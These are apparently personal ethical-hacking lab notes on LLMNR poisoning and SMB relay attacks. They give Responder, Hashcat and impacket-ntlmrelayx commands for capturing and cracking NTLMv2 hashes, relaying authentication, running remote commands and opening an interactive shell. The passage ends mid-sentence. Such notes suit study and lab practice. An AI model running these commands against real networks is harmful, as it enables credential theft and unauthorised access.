## 1. LLMNR Poisoning - NC

#### Tools
* **Responder**
* **Hashcat**

#### Attack
```
sudo responder -I eth0 -dwv 
```

#### Event
* When any user in tries to connect to another user or file share which the domain server can not resolve to any location, responder sends poisoned response and replies on behalf of the server that it knows where the destination is and asks for hash to authenticate and referred to the location which results in our output **(NTLMV2 Hash)**
#### Output 
* NTLM V2 hash
* Use [Hashcat](https://github.com/lucifugous/Practical-Ethical-Hacking-Notes/blob/main/Practical%20Ethical%20Hacking/Hashcat/Hashcat.md) to crack plaintext password from the hash :
```
	hashcat -m 5600 hash.txt wordlist.txt
	hashcat -m 5600 hash.txt wordlist.txt --show
```


---

## 2. SMB Relay Attack - NC

#### Tools
- **nmap**
- **Responder**
* **impacket-ntlmrelayx**
* **ntlmrelayx.py**

### Requirement
1. The host needs to have SMB sign in enabled but not enforced/ required. Check with following command 
   ==``` nmap --script=smb2-security-mode.nse -p445 -Pn 192.168.57.135 ```==
2. Responder needs to have ==` HTTP `== and ==` smb `== switched off
   ==``` sudo mousepad /etc/responder/Responder.conf ```==
3. Create a file with target IPs for ease of attack
   ==``` echo "192.168.57.130\n192.168.57.131" > targets.txt ```==

#### Attack
```
	sudo responder -I eth0 -dwv
	sudo impacket-ntlmrelayx -tf targets.txt --smb2support
				OR
	sudo impacket-ntlmrelayx -tf targets.txt --smb2support -i
				OR
	sudo impacket-ntlmrelayx -tf targets.txt --smb2support -c 'whoami'
```
- ==`-i`== option will create a interactive shell instance which can be used to bind with using ==` netcat `== :
